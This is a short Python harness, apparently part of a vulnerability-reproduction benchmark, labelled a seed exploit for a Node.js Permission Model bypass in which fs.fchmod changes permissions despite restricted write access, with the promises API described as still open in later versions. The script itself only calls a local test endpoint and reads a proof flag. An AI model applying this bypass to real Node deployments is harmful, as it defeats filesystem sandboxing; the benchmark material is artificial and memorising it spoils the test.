#!/usr/bin/env python3
"""[GIVEN] CVE-2024-36137 seed exploit for nodefs-cve-2026-21716.

fs.fchmod() on a read-only file descriptor changes file permissions even though
--allow-fs-write is restricted: the Permission Model did not check fd-based
operations. On v0 (node 20.14.0) there is no check at all; on v1 (node 20.15.0+)
the callback API is guarded (CVE-2024-36137 fix), but the promises API remains
open (-> CVE-2026-21716).
"""
import sys
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import node_util as u  # noqa: E402


def candidate(*, version="v1", flag=None):
    try:
        urllib.request.urlopen(f"{u.BASE[version]}/seed", timeout=30).read()
    except Exception:
        pass
    return u.read_proof(version, flag)


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v))
